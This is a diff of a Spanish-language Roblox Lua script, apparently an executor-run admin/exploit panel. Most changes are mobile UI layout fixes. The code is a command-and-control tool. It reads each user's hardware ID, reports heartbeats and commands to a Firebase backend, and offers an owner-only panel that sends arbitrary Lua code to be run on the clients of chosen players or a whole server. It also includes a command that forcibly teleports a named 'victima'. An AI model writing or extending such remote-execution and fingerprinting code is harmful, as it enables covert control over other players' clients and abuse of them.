+                    meAfecta = (myName:sub(1, #victimaArg) == victimaArg)
+                end
+                if meAfecta then
+                    task.spawn(function()
+                        task.wait(0.3)
+                        local ok = pcall(function()
+                            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+                        end)
+                        if not ok then
+                            task.wait(1)
+                            pcall(function()
+                                TeleportService:Teleport(game.PlaceId, LocalPlayer)
+                            end)
+                        end
                     end)
                 end
-            end)
-        end
-    end
+            end
 
             if isAdmin and not isOwner then
-                local cmdPrefix = cmd:match("^(%S+)")
+                local cmdPrefixCheck = cmd:match("^(%S+)")
                 local ownerOnly = {".q", ".qq", ".r", ".k", ".m"}
                 for _, oc in ipairs(ownerOnly) do
-                    if cmdPrefix == oc then return end
+                    if cmdPrefixCheck == oc then return end
                 end
             end
-local cmdKey = tostring(os.time()) .. "_" .. myUserId
-local myHwid = ""
-pcall(function()
-    if gethwid then myHwid = tostring(gethwid())
-    elseif getdeviceid then myHwid = tostring(getdeviceid()) end
-end)
-firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
-    sender_id   = myUserId,
-    sender_name = LocalPlayer.Name,
-    sender_hwid = myHwid,
-    sender_role = myRole,
-    server_id   = currentServerId, 
-    command     = cmd,
-    timestamp   = os.time()
-})
+            local cmdKey = tostring(os.time()) .. "_" .. myUserId
+            local myHwid = ""
+            pcall(function()
+                if gethwid then myHwid = tostring(gethwid())
+                elseif getdeviceid then myHwid = tostring(getdeviceid()) end
+            end)
+            firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
+                sender_id   = myUserId,
+                sender_name = LocalPlayer.Name,
+                sender_hwid = myHwid,
+                sender_role = myRole,
+                server_id   = currentServerId, 
+                command     = cmd,
+                timestamp   = os.time()
+            })
             commandInput.Text = ""
             local originalColor = sendBtn.BackgroundColor3
             sendBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
@@ -2047,7 +2021,9 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
         sendBtn.MouseButton1Click:Connect(function() SendCommand(commandInput.Text) end)
         commandInput.FocusLost:Connect(function(enter) if enter then SendCommand(commandInput.Text) end end)
 
-        -- PANEL EJECUCION (solo owners)
+        -- ============================================================
+        -- PANEL EJECUCION (solo owners) — FIX MÓVIL COMPLETO
+        -- ============================================================
         local executionPanel = Instance.new("Frame")
         executionPanel.Name = "ExecutionPanel"
         executionPanel.Size = UDim2.new(1, -10, 1, -10)
@@ -2057,29 +2033,32 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
         executionPanel.Parent = contentFrame
 
         local execTitle = Instance.new("TextLabel")
-        execTitle.Size = UDim2.new(1, 0, 0, 30)
+        execTitle.Size = UDim2.new(1, 0, 0, isMobile and 22 or 30)
         execTitle.BackgroundTransparency = 1
         execTitle.Font = Enum.Font.GothamBold
         execTitle.Text = "💻 Ejecutar script de forma remota"
         execTitle.TextColor3 = Color3.fromRGB(255, 215, 100)
-        execTitle.TextSize = 16
+        -- *** FIX MÓVIL: texto más pequeño en móvil ***
+        execTitle.TextSize = isMobile and 13 or 16
         execTitle.TextXAlignment = Enum.TextXAlignment.Left
         execTitle.Parent = executionPanel
 
         local execSubtitle = Instance.new("TextLabel")
-        execSubtitle.Size = UDim2.new(1, 0, 0, 18)
-        execSubtitle.Position = UDim2.new(0, 0, 0, 28)
+        execSubtitle.Size = UDim2.new(1, 0, 0, isMobile and 14 or 18)
+        execSubtitle.Position = UDim2.new(0, 0, 0, isMobile and 22 or 28)
         execSubtitle.BackgroundTransparency = 1
         execSubtitle.Font = Enum.Font.Gotham
         execSubtitle.Text = "Ejecuta codigo • .s = server | name = Jugador especifico"
         execSubtitle.TextColor3 = Color3.fromRGB(150, 150, 160)
-        execSubtitle.TextSize = 11
+        -- *** FIX MÓVIL: texto más pequeño en móvil ***
+        execSubtitle.TextSize = isMobile and 9 or 11
         execSubtitle.TextXAlignment = Enum.TextXAlignment.Left
         execSubtitle.Parent = executionPanel
 
         local targetInputFrame = Instance.new("Frame")
-        targetInputFrame.Size = UDim2.new(1, 0, 0, 40)
-        targetInputFrame.Position = UDim2.new(0, 0, 0, 52)
+        -- *** FIX MÓVIL: altura reducida y posición ajustada ***
+        targetInputFrame.Size = UDim2.new(1, 0, 0, isMobile and 36 or 40)
+        targetInputFrame.Position = UDim2.new(0, 0, 0, isMobile and 40 or 52)
         targetInputFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
         targetInputFrame.BorderSizePixel = 0
         targetInputFrame.Parent = executionPanel
@@ -2114,9 +2093,12 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
 
         local TextService = game:GetService("TextService")
 
+        -- *** FIX MÓVIL: el editor de código ocupa el espacio restante correctamente ***
+        -- En móvil: título(22) + subtítulo(14) + gap(4) + targetInput(36) + gap(6) = 82px usados arriba
+        --           botones(40) abajo → codeInputFrame = total - 82 - 40 - 10(padding) = restante
         local codeInputFrame = Instance.new("Frame")
-        codeInputFrame.Size = UDim2.new(1, 0, 1, -163)
-        codeInputFrame.Position = UDim2.new(0, 0, 0, 102)
+        codeInputFrame.Size = UDim2.new(1, 0, 1, isMobile and -132 or -163)
+        codeInputFrame.Position = UDim2.new(0, 0, 0, isMobile and 82 or 102)
         codeInputFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
         codeInputFrame.BorderSizePixel = 0
         codeInputFrame.Parent = executionPanel
@@ -2132,8 +2114,8 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
         codeBorder.Parent = codeInputFrame
 
         local lineCounterScroll = Instance.new("ScrollingFrame")
-        lineCounterScroll.Size = UDim2.new(0, 45, 1, -20)
-        lineCounterScroll.Position = UDim2.new(0, 5, 0, 10)
+        lineCounterScroll.Size = UDim2.new(0, 35, 1, -16)
+        lineCounterScroll.Position = UDim2.new(0, 4, 0, 8)
         lineCounterScroll.BackgroundTransparency = 1
         lineCounterScroll.BorderSizePixel = 0
         lineCounterScroll.ScrollBarThickness = 0
@@ -2142,36 +2124,38 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
         lineCounterScroll.Parent = codeInputFrame
 
         local lineCounter = Instance.new("TextLabel")
-        lineCounter.Size = UDim2.new(1, -10, 0, 0)
-        lineCounter.Position = UDim2.new(0, 5, 0, 0)
+        lineCounter.Size = UDim2.new(1, -4, 0, 0)
+        lineCounter.Position = UDim2.new(0, 2, 0, 0)
         lineCounter.BackgroundTransparency = 1
         lineCounter.Font = Enum.Font.Code
         lineCounter.Text = "1"
         lineCounter.TextColor3 = Color3.fromRGB(100, 100, 120)
-        lineCounter.TextSize = 13
+        -- *** FIX MÓVIL: fuente más pequeña en el contador de líneas ***
+        lineCounter.TextSize = isMobile and 11 or 13
         lineCounter.TextXAlignment = Enum.TextXAlignment.Right
         lineCounter.TextYAlignment = Enum.TextYAlignment.Top
         lineCounter.Parent = lineCounterScroll
 
         local codeScroll = Instance.new("ScrollingFrame")
-        codeScroll.Size = UDim2.new(1, -60, 1, -20)
-        codeScroll.Position = UDim2.new(0, 55, 0, 10)
+        codeScroll.Size = UDim2.new(1, -48, 1, -16)
+        codeScroll.Position = UDim2.new(0, 44, 0, 8)
         codeScroll.BackgroundTransparency = 1
         codeScroll.BorderSizePixel = 0
-        codeScroll.ScrollBarThickness = 6
+        codeScroll.ScrollBarThickness = 5
         codeScroll.ScrollBarImageColor3 = Color3.fromRGB(88, 101, 242)
         codeScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
         codeScroll.Parent = codeInputFrame
 
         local codeInput = Instance.new("TextBox")
-        codeInput.Size = UDim2.new(1, -10, 0, 20)
+        codeInput.Size = UDim2.new(1, -8, 0, 20)
         codeInput.Position = UDim2.new(0, 0, 0, 0)
         codeInput.BackgroundTransparency = 1
         codeInput.Font = Enum.Font.Code
         codeInput.PlaceholderText = "-- Enter Lua code here..."
         codeInput.Text = ""
         codeInput.TextColor3 = Color3.fromRGB(200, 220, 255)
-        codeInput.TextSize = 13
+        -- *** FIX MÓVIL: fuente más pequeña en el editor ***
+        codeInput.TextSize = isMobile and 11 or 13
         codeInput.TextXAlignment = Enum.TextXAlignment.Left
         codeInput.TextYAlignment = Enum.TextYAlignment.Top
         codeInput.ClearTextOnFocus = false
@@ -2196,18 +2180,19 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
                 Vector2.new(codeInput.AbsoluteSize.X, math.huge)
             )
             local height = textSize.Y + 10
-            codeInput.Size = UDim2.new(1, -10, 0, height)
+            codeInput.Size = UDim2.new(1, -8, 0, height)
             codeScroll.CanvasSize = UDim2.new(0, 0, 0, height)
-            lineCounter.Size = UDim2.new(1, -10, 0, height)
+            lineCounter.Size = UDim2.new(1, -4, 0, height)
             lineCounterScroll.CanvasSize = UDim2.new(0, 0, 0, height)
         end
 
         codeInput:GetPropertyChangedSignal("Text"):Connect(updateEditor)
         updateEditor()
 
+        -- *** FIX MÓVIL: botones más compactos ***
         local execButtonsFrame = Instance.new("Frame")
-        execButtonsFrame.Size = UDim2.new(1, 0, 0, 48)
-        execButtonsFrame.Position = UDim2.new(0, 0, 1, -48)
+        execButtonsFrame.Size = UDim2.new(1, 0, 0, isMobile and 40 or 48)
+        execButtonsFrame.Position = UDim2.new(0, 0, 1, isMobile and -40 or -48)
         execButtonsFrame.BackgroundTransparency = 1
         execButtonsFrame.Parent = executionPanel
 
@@ -2218,7 +2203,8 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
         executeBtn.Font = Enum.Font.GothamBold
         executeBtn.Text = "▶ Ejecutar"
         executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        executeBtn.TextSize = 14
+        -- *** FIX MÓVIL: texto más pequeño en botones ***
+        executeBtn.TextSize = isMobile and 12 or 14
         executeBtn.AutoButtonColor = false
         executeBtn.Parent = execButtonsFrame
 
@@ -2242,7 +2228,8 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
         clearBtn.Font = Enum.Font.GothamBold
         clearBtn.Text = "🗑 Borrar"
         clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        clearBtn.TextSize = 14
+        -- *** FIX MÓVIL: texto más pequeño en botones ***
+        clearBtn.TextSize = isMobile and 12 or 14
         clearBtn.AutoButtonColor = false
         clearBtn.Parent = execButtonsFrame
 
@@ -2263,24 +2250,24 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
             TweenService:Create(clearBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 80, 80)}):Play()
         end)
 
-if isOwner then
+        if isOwner then
             local function ExecuteRemoteCode(code, target)
                 if code == "" then return end
                 target = (target or ".s"):gsub("^%s+", ""):gsub("%s+$", "")
                 local execId = HttpService:GenerateGUID(false)
                 local myHwid = ""
-pcall(function()
-    if gethwid then myHwid = tostring(gethwid())
-    elseif getdeviceid then myHwid = tostring(getdeviceid()) end
-end)
-firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
-    code        = code,
-    target      = target,
-    sender_name = LocalPlayer.Name,
-    sender_hwid = myHwid,
-    serverId    = currentServerId,
-    timestamp   = os.time()
-})
+                pcall(function()
+                    if gethwid then myHwid = tostring(gethwid())
+                    elseif getdeviceid then myHwid = tostring(getdeviceid()) end
+                end)
+                firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
+                    code        = code,
+                    target      = target,
+                    sender_name = LocalPlayer.Name,
+                    sender_hwid = myHwid,
+                    serverId    = currentServerId,
+                    timestamp   = os.time()
+                })
                 executeBtn.Text = "✓ Code Sent!"
                 executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
                 task.wait(1.5)
@@ -2288,8 +2275,6 @@ firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
                 executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
             end
 
-
-            
             executeBtn.MouseButton1Click:Connect(function()
                 task.spawn(function()
                     ExecuteRemoteCode(codeInput.Text, targetInput.Text)
@@ -2301,11 +2286,11 @@ firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
                 targetInput.Text = ".s"
                 lineCounter.Text = "1"
             end)
-        end -- cierra if isOwner
+        end
 
+        -- ============================================================
         -- PANEL CONFIG
-
-        -- PANEL CONFIG
+        -- ============================================================
         local configPanel = Instance.new("Frame")
         configPanel.Name = "ConfigPanel"
         configPanel.Size = UDim2.new(1, -10, 1, -10)
@@ -2382,16 +2367,16 @@ firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
                 }):Play()
                 toggleBtn.Text = "ON"
 
-  task.spawn(function()
+                task.spawn(function()
                     while heartbeatActive do
                         pcall(function()
-firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
-                        username  = LocalPlayer.Name,
-                        role      = myRole,
-                        server_id = currentServerId,
-                        place_id  = tostring(game.PlaceId),
-                        timestamp = os.time()
-                    })
+                            firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
+                                username  = LocalPlayer.Name,
+                                role      = myRole,
+                                server_id = currentServerId,
+                                place_id  = tostring(game.PlaceId),
+                                timestamp = os.time()
+                            })
                         end)
                         task.wait(2)
                         UpdatePlayersList()
@@ -2473,7 +2458,9 @@ firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
         versionLabel.TextYAlignment = Enum.TextYAlignment.Center
         versionLabel.Parent = versionInfo
 
+        -- ============================================================
         -- PANEL SERVIDORES
+        -- ============================================================
         local serversPanel = Instance.new("Frame")
         serversPanel.Name = "ServersPanel"
         serversPanel.Size = UDim2.new(1, -10, 1, -10)
@@ -2611,9 +2598,7 @@ firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
         serverInfoLabel.TextWrapped = true
         serverInfoLabel.Parent = serverInfoFrame
 
-        local TeleportService = game:GetService("TeleportService")
-
-local function TeleportToServer(link)
+        local function TeleportToServer(link)
             if link == "" or not link:match("placeId=") then
                 teleportBtn.Text = "❌ Link inválido"
                 teleportBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
@@ -2638,20 +2623,17 @@ local function TeleportToServer(link)
             teleportBtn.Text = "⏳ Teleportando..."
             teleportBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 100)
 
-            -- Un solo intento limpio, sin métodos alternativos que se pisen
             local ok, err = pcall(function()
                 TeleportService:TeleportToPlaceInstance(tonumber(placeId), gameInstanceId, LocalPlayer)
             end)
 
             if not ok then
-                -- Solo si falló del todo, mostrar error
                 teleportBtn.Text = "❌ Error: " .. tostring(err):sub(1, 30)
                 teleportBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
                 task.wait(2)
                 teleportBtn.Text = "🚀 Teleportarme"
                 teleportBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
             end
-            -- Si ok=true el juego empieza a cargar, no hace falta resetear el botón
         end
 
         teleportBtn.MouseButton1Click:Connect(function() TeleportToServer(linkInput.Text) end)
@@ -2659,15 +2641,17 @@ local function TeleportToServer(link)
             if enterPressed then TeleportToServer(linkInput.Text) end
         end)
 
+        -- ============================================================
         -- SWITCH TABS
+        -- ============================================================
         local currentTab = "Players"
         local tabs = {playersTab, commandsTab, executionTab, configTab}
         local panels = {
-            Players = playersPanel,
-            Commands = commandsPanel,
-            Servers = serversPanel,
+            Players   = playersPanel,
+            Commands  = commandsPanel,
+            Servers   = serversPanel,
             Execution = executionPanel,
-            Config = configPanel
+            Config    = configPanel
         }
 
         local function SwitchTab(tabName)
@@ -2726,7 +2710,7 @@ local function TeleportToServer(link)
                     closeBtn.TextSize = 30
                 else
                     local fw = 412
-                    local fh = 300
+                    local fh = 360  -- *** FIX: mismo valor que frameHeight móvil ***
                     TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                         Size = UDim2.new(0, fw, 0, fh),
                         Position = UDim2.new(0.5, -fw/2, 0.5, -fh/2)
@@ -2767,11 +2751,11 @@ local function TeleportToServer(link)
         local function MinimizeUI()
             isMinimized = not isMinimized
             local targetSize = isMinimized and UDim2.new(0, 280, 0, 50) or originalSize
-            local targetPos = isMinimized and UDim2.new(1, -290, 0, 10) or originalPos
+            local targetPos  = isMinimized and UDim2.new(1, -290, 0, 10) or originalPos
             TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = targetSize, Position = targetPos}):Play()
             TweenService:Create(shadowFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
-                Size = isMinimized and UDim2.new(0, 290, 0, 60) or UDim2.new(0, 560, 0, 410),
-                Position = isMinimized and UDim2.new(1, -295, 0, 5) or UDim2.new(0.5, -280, 0.5, -205)
+                Size = isMinimized and UDim2.new(0, 290, 0, 60) or UDim2.new(0, shadowWidth, 0, shadowHeight),
+                Position = isMinimized and UDim2.new(1, -295, 0, 5) or UDim2.new(0.5, -shadowWidth/2, 0.5, -shadowHeight/2)
             }):Play()
             tabsContainer.Visible = not isMinimized
             contentFrame.Visible = not isMinimized
@@ -2832,6 +2816,5 @@ local function TeleportToServer(link)
         }):Play()
 
         task.delay(1, UpdatePlayersList)
-    -- cierra: if isOwner then (del ExecuteRemoteCode)
-    end) 
+    end)
 end)
